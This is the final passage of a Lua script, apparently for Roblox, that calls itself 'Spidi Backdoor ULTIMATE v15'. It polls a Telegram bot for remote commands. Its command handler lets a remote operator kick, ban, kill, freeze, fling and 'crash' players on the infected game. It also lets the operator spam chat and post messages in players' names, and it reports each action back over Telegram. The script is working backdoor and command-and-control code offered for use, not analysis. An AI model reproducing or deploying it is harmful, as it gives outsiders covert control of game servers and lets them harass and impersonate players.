            sendMessage("🔇 Музыка выключена для <b>"..target.Name.."</b>!")
        else
            sendMessage("❌ У <b>"..target.Name.."</b> нет активной музыки")
        end
        return
    end
    
    local input = args[1]
    if not input then
        sendMessage("❌ Укажи ник/номер/all")
        return
    end
    
    local targets, err = findPlayer(input)
    if not targets then
        sendMessage("❌ "..err)
        return
    end
    
    if type(targets) == "table" and targets[1] and targets[1] == "all" then
        local allPlayers = {}
        for _, p in pairs(Players:GetPlayers()) do
            if scriptUsers[p.UserId] and p ~= myPlayer then
                table.insert(allPlayers, p)
            end
        end
        targets = allPlayers
    end
    
    if type(targets) ~= "table" then
        targets = {targets}
    end
    
    local filtered = {}
    for _, p in pairs(targets) do
        if p ~= myPlayer then
            table.insert(filtered, p)
        end
    end
    targets = filtered
    
    if #targets == 0 then
        sendMessage("❌ Нет целей для команды")
        return
    end
    
    local reason = table.concat(args, " ", 2)
    if reason == input then
        reason = ""
    end
    
    for _, target in pairs(targets) do
        if cmd == "ban" and bannedPlayers[target.UserId] then
            sendMessage("⚠️ <b>"..target.Name.."</b> уже забанен")
            goto continue
        end
        
        if cmd == "kick" and kickedPlayers[target.UserId] then
            sendMessage("⚠️ <b>"..target.Name.."</b> уже кикнут")
            goto continue
        end
        
        local char = target.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local humanoid = char and char:FindFirstChild("Humanoid")
        
        if cmd == "kick" then
            if reason ~= "" then
                target:Kick(reason)
            else
                target:Kick("Kicked by Spidi Backdoor")
            end
            kickedPlayers[target.UserId] = true
            if reason ~= "" then
                sendMessage("✅ Кикнут: <b>"..target.Name.."</b> (Причина: "..reason..")")
            else
                sendMessage("✅ Кикнут: <b>"..target.Name.."</b>")
            end
            
        elseif cmd == "ban" then
            if reason ~= "" then
                target:Kick(reason)
            else
                target:Kick("Banned by Spidi Backdoor")
            end
            bannedPlayers[target.UserId] = true
            if reason ~= "" then
                sendMessage("✅ Забанен: <b>"..target.Name.."</b> (Причина: "..reason..")")
            else
                sendMessage("✅ Забанен: <b>"..target.Name.."</b>")
            end
            
        elseif cmd == "unban" then
            if bannedPlayers[target.UserId] then
                bannedPlayers[target.UserId] = nil
                target:Kick("Unbanned by Spidi Backdoor")
                sendMessage("✅ Разбанен: <b>"..target.Name.."</b>")
            else
                sendMessage("⚠️ <b>"..target.Name.."</b> не был забанен")
            end
            
        elseif cmd == "kill" and humanoid then
            humanoid.Health = 0
            sendMessage("💀 Убит: <b>"..target.Name.."</b>")
            
        elseif cmd == "freeze" and hrp and humanoid then
            hrp.Anchored = true
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
            sendMessage("🧊 Заморожен: <b>"..target.Name.."</b>")
            
        elseif cmd == "unfreeze" and hrp and humanoid then
            hrp.Anchored = false
            humanoid.WalkSpeed = 16
            humanoid.JumpPower = 50
            sendMessage("🔥 Разморожен: <b>"..target.Name.."</b>")
            
        elseif cmd == "fly" and hrp then
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(1, 1, 1) * 1e8
            bv.Velocity = Vector3.new(0, 50, 0)
            bv.Parent = hrp
            Debris:AddItem(bv, 5)
            sendMessage("✈️ Полетел: <b>"..target.Name.."</b>")
            
        elseif cmd == "unfly" and hrp then
            for _, v in pairs(hrp:GetChildren()) do
                if v:IsA("BodyVelocity") then
                    v:Destroy()
                end
            end
            sendMessage("🛑 Отключен полет: <b>"..target.Name.."</b>")
            
        elseif cmd == "crash" and hrp then
            local pos = hrp.Position
            for i = 1, 100 do
                local p = Instance.new("Part")
                p.Size = Vector3.new(5, 5, 5)
                p.Position = pos + Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
                p.Anchored = true
                p.Parent = Workspace
                Debris:AddItem(p, 2)
            end
            sendMessage("💥 Крашнут: <b>"..target.Name.."</b>")
            
        elseif cmd == "fling" then
            flingPlayer(target)
            sendMessage("🌀 Флинг на <b>"..target.Name.."</b>")
            
        elseif cmd == "loopkill" and humanoid then
            spawn(function()
                for i = 1, 10 do
                    if not target or not target.Character then
                        break
                    end
                    local hum = target.Character:FindFirstChild("Humanoid")
                    if hum then
                        hum.Health = 0
                    end
                    task.wait(0.5)
                end
            end)
            sendMessage("🔄 Loopkill на <b>"..target.Name.."</b>")
            
        elseif cmd == "stun" and humanoid then
            stunPlayer(target)
            sendMessage("⚡ Оглушен на 3 сек: <b>"..target.Name.."</b>")
            
        elseif cmd == "jump" and humanoid then
            humanoid.Jump = true
            sendMessage("🦘 Прыжок: <b>"..target.Name.."</b>")
            
        elseif cmd == "spin" then
            local speed = tonumber(args[2]) or 1
            speed = math.clamp(speed, 0.5, 10)
            if spinPlayer(target, speed) then
                sendMessage("🔄 Вращение ("..speed.."x): <b>"..target.Name.."</b>")
            end
            
        elseif cmd == "unspin" then
            if unspinPlayer(target) then
                sendMessage("✅ Остановлено вращение: <b>"..target.Name.."</b>")
            end
            
        elseif cmd == "explode" and hrp then
            local pos = hrp.Position
            for i = 1, 30 do
                local p = Instance.new("Part")
                p.Size = Vector3.new(3, 3, 3)
                p.Position = pos + Vector3.new(math.random(-20, 20), math.random(-20, 20), math.random(-20, 20))
                p.Anchored = true
                p.Material = Enum.Material.Neon
                p.BrickColor = BrickColor.new("Bright red")
                p.Parent = Workspace
                Debris:AddItem(p, 1)
            end
            sendMessage("💥 Взрыв: <b>"..target.Name.."</b>")
            
        elseif cmd == "des" then
            desorientPlayer(target)
            sendMessage("🌀 Дезориентация камеры (3 сек): <b>"..target.Name.."</b>")
            
        elseif cmd == "say" then
            local msg = table.concat(args, " ", 2)
            if msg == "" or msg == input then
                sendMessage("❌ /say [ник/all] [текст]")
                return
            end
            sayMessage(target, msg)
            sendMessage("✅ Сказано от имени <b>"..target.Name.."</b>: "..msg)
            
        elseif cmd == "spam" then
            local count = tonumber(args[2]) or 5
            local msg = table.concat(args, " ", 3)
            if msg == "" or msg == input then
                sendMessage("❌ /spam [ник/all] [кол-во] [текст]")
                return
            end
            for i = 1, math.min(count, 20) do
                task.wait(0.1)
                sayMessage(target, msg.." "..i)
            end
            sendMessage("✅ Спам отправлен от имени <b>"..target.Name.."</b> ("..math.min(count, 20).." раз)")
            
        elseif cmd == "message" then
            local msg = table.concat(args, " ", 2)
            if msg == "" or msg == input then
                sendMessage("❌ /message [ник/all] [текст]")
                return
            end
            if not canSendMessage(target) then
                sendMessage("⏳ Подожди 0.3 сек перед следующим сообщением")
                return
            end
            showNotification(target, msg, 5)
            sendMessage("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
            
        elseif cmd == "warp" then
            local level = tonumber(args[2]) or 5
            level = math.clamp(level, 1, 10)
            local blur = Lighting:FindFirstChild("SpidiWarp")
            if not blur then
                blur = Instance.new("BlurEffect")
                blur.Name = "SpidiWarp"
                blur.Parent = Lighting
            end
            blur.Size = level * 3
            sendMessage("🌀 Размытие "..level.."/10 на <b>"..target.Name.."</b>")
            
        elseif cmd == "unwarp" then
            local blur = Lighting:FindFirstChild("SpidiWarp")
            if blur then
                blur:Destroy()
                sendMessage("✅ Размытие убрано у <b>"..target.Name.."</b>")
            else
                sendMessage("❌ Нет активного размытия у <b>"..target.Name.."</b>")
            end
            
        else
            sendMessage("❌ Неизвестная команда. /help")
        end
        
        ::continue::
    end
end

local oldPlayers = {}
local function checkNewPlayers()
    for _, p in pairs(Players:GetPlayers()) do
        if not oldPlayers[p.UserId] then
            if p:FindFirstChild("SpidiUser") then
                addScriptUser(p)
            end
            oldPlayers[p.UserId] = true
        end
    end
end

spawn(function()
    while true do
        pcall(checkNewPlayers)
        wait(3)
    end
end)

local lastId = 0
local function pollUpdates()
    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId + 1), "GET", {})
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result then
            for _, update in pairs(data.result) do
                if update.message and update.message.text then
                    local msg = update.message
                    if not CHAT_ID then
                        CHAT_ID = msg.chat.id
                        sendMessage("✅ Spidi Backdoor ULTIMATE v15 запущен!\n👤 Hacker228")
                    end
                    local text = msg.text
                    if text:sub(1, 1) == "/" then
                        local parts = {}
                        for w in string.gmatch(text, "%S+") do
                            table.insert(parts, w)
                        end
                        local cmd = parts[1]:sub(2):lower()
                        table.remove(parts, 1)
                        handleCommand(cmd, parts)
                    end
                end
                if update.update_id then
                    lastId = update.update_id
                end
            end
        end
    end
end

spawn(function()
    while true do
        pcall(pollUpdates)
        wait(2)
    end
end)

wait(3)
getChatId()

if CHAT_ID then
    sendMessage("✅ Spidi Backdoor ULTIMATE v15 запущен!\n👤 Hacker228\n📋 /players - список пользователей\n🎵 /music [ник] [айди] - играть музыку")
end
